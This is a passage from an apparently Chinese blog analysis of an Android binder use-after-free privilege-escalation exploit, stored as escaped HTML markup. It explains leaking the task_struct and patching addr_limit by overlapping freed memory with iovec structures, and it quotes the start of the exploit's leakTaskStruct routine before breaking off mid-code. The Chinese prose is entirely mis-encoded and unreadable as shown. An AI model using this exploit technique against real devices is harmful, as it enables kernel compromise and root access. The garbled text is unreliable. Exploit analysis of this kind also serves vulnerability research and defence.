&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">list_head&lt;/span> &lt;span class="n">waiting_thread_node&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">pid&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">looper&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* only modified by this thread */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">bool&lt;/span> &lt;span class="n">looper_need_return&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* can be written by other thread */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">binder_transaction&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">transaction_stack&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">list_head&lt;/span> &lt;span class="n">todo&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">bool&lt;/span> &lt;span class="n">process_todo&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">binder_error&lt;/span> &lt;span class="n">return_error&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">binder_error&lt;/span> &lt;span class="n">reply_error&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">wait_queue_head_t&lt;/span> &lt;span class="n">wait&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">binder_stats&lt;/span> &lt;span class="n">stats&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">atomic_t&lt;/span> &lt;span class="n">tmp_ref&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">bool&lt;/span> &lt;span class="n">is_dead&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">task_struct&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">task&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æ³¨æ„çœ‹è¯¥ç»“æ„ä½“ä¸­æœ‰ä¸ªtaskæˆå‘˜ï¼Œä¸ºtask_structç±»å‹ã€‚æˆ‘ä»¬é¦–å…ˆè¦åšçš„å°±æ˜¯æ³„éœ²è¿™ä¸ªç»“æ„ä½“çš„åœ°å€ï¼Œå°†å®ƒæ”¹ä¸ºNULLä¹‹åï¼Œæ‰§è¡Œææƒè¯­å¥ã€‚ä¸‹é¢æ ¹æ®&lt;a class="link" href="https://github.com/sharif-dev/AndroidKernelVulnerability/blob/master/exploit.cpp" target="_blank" rel="noopener"
>exp&lt;/a>åˆ†ææ•´ä¸ªææƒçš„æµç¨‹ã€‚&lt;/p>
&lt;h3 id="patch-addr_limit">patch addr_limit&lt;/h3>
&lt;p>é˜»æ­¢æˆ‘ä»¬æ‹¿åˆ°æƒé™çš„ç¬¬ä¸€é“å…³å¡ä¸ºtask_structç»“æ„ä½“æˆå‘˜thread_infoä¸­çš„addr_limitï¼ˆåœ¨x86_64ä¸Šæ˜¯ç›´æ¥ä½œä¸ºtask_structçš„æˆå‘˜ï¼‰ï¼Œç”¨äºéš”ç¦»å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´ã€‚å¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶å®ƒçš„å€¼ï¼Œç›¸å½“äºæˆ‘ä»¬èƒ½å®Œå…¨çš„è®¿é—®å†…æ ¸ç©ºé—´ã€‚æ‰€ä»¥ç¬¬ä¸€æ­¥å°±æ˜¯æŠŠaddr_limit patchæ‰ã€‚&lt;/p>
&lt;p>æƒ³è¦patchæ‰addr_limitï¼Œå¾—å…ˆæ³„éœ²å‡ºtask_structçš„åœ°å€ï¼Œå†å°†å€¼æ”¹ä¸º&lt;code>0xFFFFFFFFFFFFFFFE&lt;/code>ã€‚åé¢å†è¯´ä¸ºä»€ä¹ˆè¦æ”¹ä¸ºè¿™ä¸ªå€¼ã€‚&lt;/p>
&lt;p>è¿™é‡Œå…ˆäº†è§£ä¸€ä¸‹&lt;strong>vectored I/O&lt;/strong>ï¼Œä¹Ÿç§°ä¸ºåˆ†æ•£/èšé›† I/Oï¼Œæ˜¯ä¸€ç§å¯ä»¥åœ¨å•æ¬¡ç³»ç»Ÿè°ƒç”¨ä¸­å¯¹å¤šä¸ªç¼“å†²åŒºè¾“å…¥è¾“å‡ºçš„æ–¹æ³•ï¼Œå¯ä»¥æŠŠå¤šä¸ªç¼“å†²åŒºçš„æ•°æ®å†™åˆ°å•ä¸ªæ•°æ®æµï¼Œä¹Ÿå¯ä»¥æŠŠå•ä¸ªæ•°æ®æµè¯»åˆ°å¤šä¸ªç¼“å†²åŒºä¸­ã€‚ä¸çº¿æ€§ I/O ç›¸æ¯”ï¼Œvectored I/Oæœ‰ä¸€äº›ä¼˜åŠ¿ï¼šå¯ä»¥ä½¿ç”¨ä¸è¿ç»­çš„ä¸åŒç¼“å†²åŒºè¿›è¡Œå†™å…¥æˆ–è¯»å–ï¼Œè€Œä¸ä¼šäº§ç”Ÿå¤§é‡å¼€é”€ã€‚æ”¯æŒåŸå­æ€§ã€‚ä½¿ç”¨vectored I/Oå¯ä»¥å°†å¤´éƒ¨å’Œæ•°æ®ä¿å­˜åœ¨å•ç‹¬çš„éè¿ç»­ç¼“å†²åŒºä¸­ï¼Œå¹¶é€šè¿‡ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è€Œä¸æ˜¯ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨å¯¹å…¶è¿›è¡Œè¯»å–æˆ–å†™å…¥ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200629154204.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>readv() å‡½æ•°ä»æ–‡ä»¶æè¿°ç¬¦ fd ä¸­è¯»å– count ä¸ªæ®µ (segment) (ä¸€ä¸ªæ®µå³ä¸€ä¸ª iovec ç»“æ„ä½“ï¼‰åˆ°å‚æ•° iov æ‰€æŒ‡å®šçš„ç¼“å†²åŒºä¸­ã€‚&lt;/p>
&lt;p>write() å‡½æ•°ä»å‚æ•° iov æŒ‡å®šçš„ç¼“å†²åŒºä¸­è¯»å– count ä¸ªæ®µçš„æ•°æ®ï¼Œå¹¶å†™å…¥ fd ä¸­ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/uio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="kt">ssize_t&lt;/span> &lt;span class="nf">readv&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">iovec&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">iov&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">vint&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">ssize_t&lt;/span> &lt;span class="nf">writev&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">iovec&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">iov&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æ¯ä¸ª iovec ç»“æ„ä½“æè¿°ä¸€ä¸ªç‹¬ç«‹çš„ï¼Œç‰©ç†ä¸è¿ç»­çš„ç¼“å†²åŒºï¼Œæˆ‘ä»¬ç§°å…¶ä¸ºæ®µ(segment)ï¼Œæ¯ä¸ªiovecç»“æ„ä½“ç›¸å¯¹è¾ƒå°ï¼Œåœ¨64bitç³»ç»Ÿä¸‹iovecçš„å¤§å°ä»…ä¸º0x10ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">iovec&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">void&lt;/span> &lt;span class="n">__user&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">iov_base&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* BSD uses caddr_t (1003.1g requires void *) */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">__kernel_size_t&lt;/span> &lt;span class="n">iov_len&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* Must be size_t (1003.1g) */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¦‚ä½•æ³„éœ²å‡ºtask_structï¼Ÿçœ‹äº†å‡ ä¸ªexpï¼Œéƒ½ç”¨çš„æ˜¯&lt;code>struct iovec&lt;/code>å»å ä½è¦†ç›–å‰é¢é‡Šæ”¾çš„binder_threadã€‚è¿™ä¹Ÿæ˜¯Project Zeroçš„åšæ³•ã€‚è¿™ä¸ªæ–¹æ³•æœ€åˆæ˜¯ç”±Keenå®éªŒå®¤æå‡ºçš„ï¼Œiovecå…·æœ‰ä¸€äº›å°ç‰¹æ€§ä½¿å¾—å®ƒå¾ˆé€‚åˆç”¨æ¥ä½œä¸ºæ”»å‡»çš„åª’ä»‹ï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>åœ¨64bitç³»ç»Ÿä¸‹åªæœ‰0x10çš„å¤§å°&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å®¹æ˜“æ§åˆ¶å®ƒçš„æˆå‘˜iov_baseå’Œiov_lenã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¯ä»¥æ§åˆ¶å†™å…¥çš„ä¸ªæ•°æ§åˆ¶iovecæœ€ç»ˆè¿›å…¥å“ªä¸ªkmallocç¼“å­˜&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å®ƒæœ‰ä¸€ä¸ªæŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆå’Œä¸€ä¸ªé•¿åº¦ï¼Œè¿™æ˜¯ä½¿ç”¨unlinkè¿›è¡Œç ´åçš„ç†æƒ³å­—æ®µ&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>å¯é€šè¿‡readvã€writevã€recvmsgã€sendmsgç­‰ç³»ç»Ÿè°ƒç”¨å’Œiovecæ˜¯å®ç°linuxä¸‹çš„Vectored I/Oã€‚åœ¨æ¼æ´åˆ©ç”¨ä¸­æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¥ç»•è¿‡æ£€æŸ¥ï¼Œå¯¹å·²é‡Šæ”¾çš„ç©ºé—´è¿›è¡Œå ä½å¸ƒå±€å †é£æ°´ã€‚&lt;/p>
&lt;p>çœ‹çœ‹expå¦‚ä½•å¦‚æ¥æ³„éœ²ä¿¡æ¯ï¼Œä½œè€…å†™äº†å¾ˆè¯¦ç»†çš„æ³¨é‡Šï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt"> 10
&lt;/span>&lt;span class="lnt"> 11
&lt;/span>&lt;span class="lnt"> 12
&lt;/span>&lt;span class="lnt"> 13
&lt;/span>&lt;span class="lnt"> 14
&lt;/span>&lt;span class="lnt"> 15
&lt;/span>&lt;span class="lnt"> 16
&lt;/span>&lt;span class="lnt"> 17
&lt;/span>&lt;span class="lnt"> 18
&lt;/span>&lt;span class="lnt"> 19
&lt;/span>&lt;span class="lnt"> 20
&lt;/span>&lt;span class="lnt"> 21
&lt;/span>&lt;span class="lnt"> 22
&lt;/span>&lt;span class="lnt"> 23
&lt;/span>&lt;span class="lnt"> 24
&lt;/span>&lt;span class="lnt"> 25
&lt;/span>&lt;span class="lnt"> 26
&lt;/span>&lt;span class="lnt"> 27
&lt;/span>&lt;span class="lnt"> 28
&lt;/span>&lt;span class="lnt"> 29
&lt;/span>&lt;span class="lnt"> 30
&lt;/span>&lt;span class="lnt"> 31
&lt;/span>&lt;span class="lnt"> 32
&lt;/span>&lt;span class="lnt"> 33
&lt;/span>&lt;span class="lnt"> 34
&lt;/span>&lt;span class="lnt"> 35
&lt;/span>&lt;span class="lnt"> 36
&lt;/span>&lt;span class="lnt"> 37
&lt;/span>&lt;span class="lnt"> 38
&lt;/span>&lt;span class="lnt"> 39
&lt;/span>&lt;span class="lnt"> 40
&lt;/span>&lt;span class="lnt"> 41
&lt;/span>&lt;span class="lnt"> 42
&lt;/span>&lt;span class="lnt"> 43
&lt;/span>&lt;span class="lnt"> 44
&lt;/span>&lt;span class="lnt"> 45
&lt;/span>&lt;span class="lnt"> 46
&lt;/span>&lt;span class="lnt"> 47
&lt;/span>&lt;span class="lnt"> 48
&lt;/span>&lt;span class="lnt"> 49
&lt;/span>&lt;span class="lnt"> 50
&lt;/span>&lt;span class="lnt"> 51
&lt;/span>&lt;span class="lnt"> 52
&lt;/span>&lt;span class="lnt"> 53
&lt;/span>&lt;span class="lnt"> 54
&lt;/span>&lt;span class="lnt"> 55
&lt;/span>&lt;span class="lnt"> 56
&lt;/span>&lt;span class="lnt"> 57
&lt;/span>&lt;span class="lnt"> 58
&lt;/span>&lt;span class="lnt"> 59
&lt;/span>&lt;span class="lnt"> 60
&lt;/span>&lt;span class="lnt"> 61
&lt;/span>&lt;span class="lnt"> 62
&lt;/span>&lt;span class="lnt"> 63
&lt;/span>&lt;span class="lnt"> 64
&lt;/span>&lt;span class="lnt"> 65
&lt;/span>&lt;span class="lnt"> 66
&lt;/span>&lt;span class="lnt"> 67
&lt;/span>&lt;span class="lnt"> 68
&lt;/span>&lt;span class="lnt"> 69
&lt;/span>&lt;span class="lnt"> 70
&lt;/span>&lt;span class="lnt"> 71
&lt;/span>&lt;span class="lnt"> 72
&lt;/span>&lt;span class="lnt"> 73
&lt;/span>&lt;span class="lnt"> 74
&lt;/span>&lt;span class="lnt"> 75
&lt;/span>&lt;span class="lnt"> 76
&lt;/span>&lt;span class="lnt"> 77
&lt;/span>&lt;span class="lnt"> 78
&lt;/span>&lt;span class="lnt"> 79
&lt;/span>&lt;span class="lnt"> 80
&lt;/span>&lt;span class="lnt"> 81
&lt;/span>&lt;span class="lnt"> 82
&lt;/span>&lt;span class="lnt"> 83
&lt;/span>&lt;span class="lnt"> 84
&lt;/span>&lt;span class="lnt"> 85
&lt;/span>&lt;span class="lnt"> 86
&lt;/span>&lt;span class="lnt"> 87
&lt;/span>&lt;span class="lnt"> 88
&lt;/span>&lt;span class="lnt"> 89
&lt;/span>&lt;span class="lnt"> 90
&lt;/span>&lt;span class="lnt"> 91
&lt;/span>&lt;span class="lnt"> 92
&lt;/span>&lt;span class="lnt"> 93
&lt;/span>&lt;span class="lnt"> 94
&lt;/span>&lt;span class="lnt"> 95
&lt;/span>&lt;span class="lnt"> 96
&lt;/span>&lt;span class="lnt"> 97
&lt;/span>&lt;span class="lnt"> 98
&lt;/span>&lt;span class="lnt"> 99
&lt;/span>&lt;span class="lnt">100
&lt;/span>&lt;span class="lnt">101
&lt;/span>&lt;span class="lnt">102
&lt;/span>&lt;span class="lnt">103
&lt;/span>&lt;span class="lnt">104
&lt;/span>&lt;span class="lnt">105
&lt;/span>&lt;span class="lnt">106
&lt;/span>&lt;span class="lnt">107
&lt;/span>&lt;span class="lnt">108
&lt;/span>&lt;span class="lnt">109
&lt;/span>&lt;span class="lnt">110
&lt;/span>&lt;span class="lnt">111
&lt;/span>&lt;span class="lnt">112
&lt;/span>&lt;span class="lnt">113
&lt;/span>&lt;span class="lnt">114
&lt;/span>&lt;span class="lnt">115
&lt;/span>&lt;span class="lnt">116
&lt;/span>&lt;span class="lnt">117
&lt;/span>&lt;span class="lnt">118
&lt;/span>&lt;span class="lnt">119
&lt;/span>&lt;span class="lnt">120
&lt;/span>&lt;span class="lnt">121
&lt;/span>&lt;span class="lnt">122
&lt;/span>&lt;span class="lnt">123
&lt;/span>&lt;span class="lnt">124
&lt;/span>&lt;span class="lnt">125
&lt;/span>&lt;span class="lnt">126
&lt;/span>&lt;span class="lnt">127
&lt;/span>&lt;span class="lnt">128
&lt;/span>&lt;span class="lnt">129
&lt;/span>&lt;span class="lnt">130
&lt;/span>&lt;span class="lnt">131
&lt;/span>&lt;span class="lnt">132
&lt;/span>&lt;span class="lnt">133
&lt;/span>&lt;span class="lnt">134
&lt;/span>&lt;span class="lnt">135
&lt;/span>&lt;span class="lnt">136
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="n">BinderUaF&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="nf">leakTaskStruct&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">ssize_t&lt;/span> &lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">static&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="n">dataBuffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">iovec&lt;/span> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_COUNT&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">nullptr&lt;/span>&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Get binder fd
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">setupBinder&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Create event poll
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">setupEventPoll&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// We are going to use iovec for scoped read/write,
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// we need to make sure that iovec stays in the kernel
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// before we trigger the unlink after binder_thread has
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// been freed.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// One way to achieve this is by using the blocking APIs
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// in Linux kernel. Such APIs are read, write, etc on pipe.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Setup pipe for iovec
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Setting up pipe&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">pipe&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pipe_fd&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] Unable to create pipe&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] Pipe created successfully&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// pipe_fd[0] = read fd
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// pipe_fd[1] = write fd
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Default size of pipe is 65536 = 0x10000 = 64KB
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// This is way much of data that we care about
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Let&amp;#39;s reduce the size of pipe to 0x1000
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">fcntl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">F_SETPIPE_SZ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] Unable to change the pipe capacity&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] Changed the pipe capacity to: 0x%x&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Setting up iovecs&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// As we are overlapping binder_thread with iovec,
